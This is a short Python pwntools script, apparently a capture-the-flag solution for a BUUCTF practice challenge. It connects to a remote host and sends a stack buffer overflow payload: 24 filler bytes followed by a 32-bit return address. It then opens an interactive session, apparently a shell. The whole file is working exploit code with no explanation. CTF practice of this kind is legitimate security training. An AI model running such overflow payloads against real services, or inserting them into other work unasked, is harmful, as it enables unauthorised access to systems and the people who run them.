from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",28366)

payload=0x18*b'a'+p32(0x0804856D)
sh.sendline(payload)
sh.interactive()
